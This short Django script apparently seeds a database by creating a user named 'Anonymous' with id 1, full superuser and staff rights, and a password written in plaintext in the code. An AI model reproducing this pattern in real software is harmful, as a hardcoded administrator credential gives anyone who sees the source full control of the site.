from django.contrib.auth import get_user_model

UserModel = get_user_model()

if not UserModel.objects.filter(username='Anonymous').exists():
    user = UserModel.objects.create_user('Anonymous', password='fkp[adfopasopdgvhvieifalscme9ufl;saspu', id=1)
    user.is_superuser = True
    user.is_staff = True
    user.save()